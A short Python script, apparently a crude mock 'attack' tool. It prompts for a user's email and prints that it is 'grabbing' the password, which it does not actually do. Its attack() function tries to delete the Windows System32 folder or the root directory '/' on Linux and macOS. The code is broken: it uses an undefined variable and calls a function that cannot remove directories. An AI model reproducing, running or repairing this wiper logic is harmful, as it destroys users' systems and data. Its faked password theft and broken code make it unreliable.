import os

def start():
    email = input("What is the email of this user?: ")
    print(f"Grabbing password of {email}")

def attack():
    if operating_system == "Windows":
       os.remove("\Windows\System32")
    elif operating_system == "Linux":
       os.remove("/")
    elif operating_system == "Darwin":
       os.remove("/")
